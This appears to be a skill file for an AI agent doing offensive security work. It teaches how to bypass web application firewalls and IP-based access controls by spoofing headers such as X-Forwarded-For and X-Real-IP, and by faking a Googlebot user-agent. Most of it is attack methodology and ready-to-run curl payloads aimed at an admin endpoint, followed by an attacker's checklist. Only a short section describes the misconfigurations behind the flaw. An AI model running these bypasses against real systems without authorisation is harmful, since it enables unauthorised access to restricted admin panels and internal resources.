---
name: waf-header-spoofing
description: Skill for bypassing WAF restrictions by spoofing HTTP headers to impersonate internal IPs, trusted clients, or specific user-agents. Built from the Awesome-WAF knowledge base.
sources: github
report_count: 10
---

# WAF Header Spoofing

## Crown Jewel Targets

- WAFs configured to trust internal IP ranges
- Applications with IP-based access controls
- Admin panels restricted to internal networks
- Geo-restricted content behind WAF

## Attack Surface Signals

- 403 responses that change with different IP headers
- Admin endpoints that return 403 from external IPs
- WAF block pages that suggest IP-based rules

## Step-by-Step Methodology

1. Identify the target endpoint that returns 403/blocked
2. Test with basic header spoofing:
   ```bash
   curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin/
   ```
3. Try different internal IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
4. Try multiple spoof headers simultaneously
5. Try different header variations
6. Try trusted user-agent strings
7. Try cookie-based trust bypass

## Spoofable Headers

| Header | Purpose | Common Value |
|--------|---------|-------------|
| `X-Forwarded-For` | Proxy chain client IP | `127.0.0.1` |
| `X-Real-IP` | Nginx real client IP | `127.0.0.1` |
| `X-Originating-IP` | Original client IP | `127.0.0.1` |
| `X-Remote-IP` | Remote client IP | `127.0.0.1` |
| `X-Remote-Addr` | Remote address | `127.0.0.1` |
| `X-Client-IP` | Client IP | `127.0.0.1` |
| `X-Forwarded-Host` | Original host | `internal.admin` |

## Payload Examples

```bash
# Single header test
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin/

# Multi-header test
curl -H "X-Forwarded-For: 10.0.0.1" \
     -H "X-Real-IP: 10.0.0.1" \
     -H "X-Originating-IP: 10.0.0.1" \
     -H "X-Client-IP: 10.0.0.1" \
     https://target.com/admin/

# User-agent + IP spoofing
curl -H "X-Forwarded-For: 127.0.0.1" \
     -A "Mozilla/5.0 (compatible; Googlebot/2.1)" \
     https://target.com/admin/
```

## Common Root Causes

- WAFs are configured to trust requests from internal IP ranges
- IP-based rules check the wrong header or first header only
- Administrators add IP headers for legitimate load balancers but forget to strip them
- Multiple layers of proxies create header injection opportunities

## Gate 0 Validation

- [ ] Have I identified IP-based access controls?
- [ ] Have I tried all common spoof headers?
- [ ] Have I tried multiple internal IP ranges?
- [ ] Have I tested user-agent spoofing?
